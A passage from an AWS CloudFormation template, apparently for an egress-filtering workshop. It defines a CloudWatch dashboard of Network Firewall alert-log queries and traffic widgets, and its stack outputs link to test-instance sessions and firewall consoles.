                              "ruleName": "${TopUDPFlowsByBytesRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 64,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top ICMP Flows",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopICMPFlowsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 71,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "# Alert Log Analysis",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 72,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "## Rule Summary",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 73,
                      "x": 0,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallAlertLogGroupName}' | stats count (*) as Count by event.alert.signature_id as SID, event.alert.action as Action, event.alert.signature as Message, event.proto as Proto\n| display SID, Action, Message, Proto, Count\n| filter event.alert.action = 'blocked'\n| sort Count desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "title": "Top Drop/Reject Rules",
                          "view": "table"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 73,
                      "x": 6,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallAlertLogGroupName}' | stats count (*) as Count by event.alert.signature_id as SID, event.alert.action as Action, event.alert.signature as Message, event.proto as Proto\n| display SID, Action, Message, Proto, Count\n| filter event.alert.action != 'blocked'\n| sort Count desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "title": "Top Alert Rules",
                          "view": "table"
                      }
                  },
                  {
                      "height": 7,
                      "width": 12,
                      "y": 73,
                      "x": 12,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallAlertLogGroupName}' | fields event.timestamp as Time, event.alert.signature_id as SID, event.alert.signature as Message, event.proto as Proto, event.src_ip as Src_IP, event.src_port as Src_Port, event.dest_ip as Dest_IP, event.dest_port as Dest_Port\n| sort event.timestamp desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "title": "Recent Alert Log Events",
                          "view": "table"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 80,
                      "x": 0,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallAlertLogGroupName}' | stats count() as blocked_src_ip by event.src_ip as src_ip\n| filter event.alert.action = 'blocked'\n| sort blocked_src_ip desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "title": "Top Blocked Source IPs",
                          "view": "pie"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 80,
                      "x": 6,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallAlertLogGroupName}' | stats count() as blocked_dest_ip by event.dest_ip as dest_ip\n| filter event.alert.action = 'blocked'\n| sort blocked_dest_ip desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "title": "Top Blocked Destination IPs",
                          "view": "pie"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 80,
                      "x": 12,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallAlertLogGroupName}' | stats count() as blocked_dest_port by event.dest_port as dest_port\n| filter event.alert.action = 'blocked'\n| sort blocked_dest_port desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "title": "Top Blocked Destination Ports",
                          "view": "pie"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 80,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Blocked Remote Access Ports - Telnet, SSH, RDP",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopBlockedRemoteAccessPortsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 12,
                      "y": 87,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Blocked TCP Flows",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopBlockedTCPFlowsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "type": "metric",
                      "height": 7,
                      "width": 12,
                      "y": 87,
                      "x": 12,
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Blocked UDP Flows",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopBlockedUDPFlowsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 94,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "## HTTP & TLS",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 95,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top HTTP Host Header",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopHTTPHostHeaderRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 95,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopBlockedHTTPHostHeaderRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top Blocked HTTP Host Header",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 95,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top HTTP URI Paths",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopHTTPURIPathsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 95,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top HTTP User-Agents",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopHTTPUserAgentsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 102,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top TLS SNI",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopTLSSNIRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 102,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopBlockedTLSSNIRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top Blocked TLS SNI",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 12,
                      "y": 102,
                      "x": 12,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallAlertLogGroupName}' | stats count(*) as Count by event.src_ip as Source_IP, event.dest_ip as Dest_IP, event.app_proto as App_Proto, event.tls.sni as SNI, event.http.hostname as Hostname\n| filter event.tls.sni like \"s3\" or event.http.hostname like \"s3\" or event.tls.sni like \"dynamodb\" or event.http.hostname like \"dynamodb\" or event.tls.sni like \"backup\" or event.http.hostname like \"backup\"\n| display Source_IP, Dest_IP, App_Proto, SNI, Hostname, Count\n| sort Count desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "title": "Top PrivateLink Endpoint Candidates (S3, DynamoDB, & Backup)",
                          "view": "table"
                      }
                  }    
              ]
          }
        - subnet_query_string: !GetAtt GenerateSubnetQueryStringCustomResource.SubnetQueryString   
      DashboardName: !Sub  ${FirewallName}-dashboard





Outputs:
  TestHostSession:
    Description: Start interactive shell on ProtectedSubnet-TestInstance1 (Simulating protected instance in your AWS environment)
    Value: !Sub https://${AWS::Region}.console.aws.amazon.com/systems-manager/session-manager/${TestInstance1}?region=${AWS::Region}
  PublicHostSession:
    Description: Start interactive shell on ProtectedSubnet-PublicTrafficHost (Simulating public host on the internet)
    Value: !Sub https://${AWS::Region}.console.aws.amazon.com/systems-manager/session-manager/${EgressInstance}?region=${AWS::Region}
  R53DNSFWConsole:
    Description: link to Route 53 Resolver DNS Firewall Console
    Value: !Sub "https://${AWS::Region}.console.aws.amazon.com/vpc/home?region=${AWS::Region}#DNSFirewallRuleGroups:"
  ANFWConsole:
    Description: Link to AWS Network Firewall Console
    Value: !Sub "https://${AWS::Region}.console.aws.amazon.com/vpc/home?region=${AWS::Region}#NetworkFirewalls:"
  ANFWAlertLog:
    Value: !Sub "https://${AWS::Region}.console.aws.amazon.com/cloudwatch/home?region=${AWS::Region}#logStream:group=/EgressWorkshop/Anfw/Alert"
    Description: ANFW Alert Logs
  FirewallDashboardURI:
    Description: AWS Network Firewall Log Analysis CloudWatch Dashboard 
    Value: !Sub 'https://console.aws.amazon.com/cloudwatch/home?region=${AWS::Region}#dashboards:name=${FirewallDashboard}'

